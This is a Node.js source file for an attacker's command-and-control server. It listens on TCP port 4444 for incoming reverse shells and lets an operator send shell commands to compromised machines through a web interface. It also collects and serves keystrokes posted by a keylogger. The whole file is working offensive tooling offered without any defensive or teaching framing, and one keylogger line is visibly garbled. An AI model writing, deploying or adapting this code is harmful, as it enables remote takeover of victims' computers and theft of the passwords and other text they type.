const express = require('express'),
app = express(),
server = require('http').Server(app),
io = require('socket.io')(server),
tcp = require('net'),
fs = require('fs'),
httpPort = 80,
tcpPort = 4444


app.use('/files', express.static(__dirname+'/public'))
app.use(express.json());


app.get(['/','/reverse-shell'], (req, res)=>{
  res.send(fs.readFileSync(__dirname + '/html/reverse-shell.html').toString())
})

app.get('/hacking', (req, res)=>{
  res.send(fs.readFileSync(__dirname + '/html/hacking-gif.html').toString())
})

var keys = ""
app.get('/keylogger', (req, res)=>{
  res.send(keys);
})

app.post('/keylogger', (req, res)=>{
  console.log(req)
  keys += req.body.data<s
  res.end()
})

server.listen(httpPort, ()=>{
  console.log('HTTP Server started, listening on Port ' + (httpPort))
})


io.on('connection', (socket)=>{
  //socket.emit('new shell', 'generateID')
for(key in reverseShellContainer){
  if(reverseShellContainer.hasOwnProperty(key)){
    socket.emit('new shell', key)
  }
}

  socket.on('command', (data)=>{
    io.emit('command', data)
    reverseShellContainer[data.id].write(Buffer.from(data.command+'\n'), 'utf8');
  })
})

var reverseShellContainer = {}

var tcpServer = tcp.createServer((socket)=>{
//console.log(socket);
  var id = generateID()
  reverseShellContainer[id] = socket
  io.emit('new shell', id)

  console.log(reverseShellContainer);

/*  process.stdin.on('data', (data)=>{
    socket.write(data)
  })*/

  socket.on('data', (buffer)=>{
    response = buffer.toString()
    io.emit('response', {'id': id, 'response': response})
  })

  /*client.on('data', (buffer)=>{
    var response = buffer.toString('utf8')
    if(!response.match(/HTTP\/1\.1 400 Bad Request/)){
      socket.write(response);
      socket.end()
    }
  })*/

  socket.on('error', ()=>{
console.log('disconnect or error')
io.emit('close', id)
//delete from reverseShellContainer
delete reverseShellContainer[id]
})
});



tcpServer.listen(tcpPort, ()=>{
  console.log('TCP Server started, listening on Port ' + (tcpPort))
});


function generateID(){
  var length = 6,
  chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890',
  result = 'sh_'

  while(reverseShellContainer[result] != null || result == 'sh_'){
    for(var i = 0; i < length; i++){
      result += chars.charAt(Math.floor(Math.random()*chars.length))
    }
  }
  return result;
}
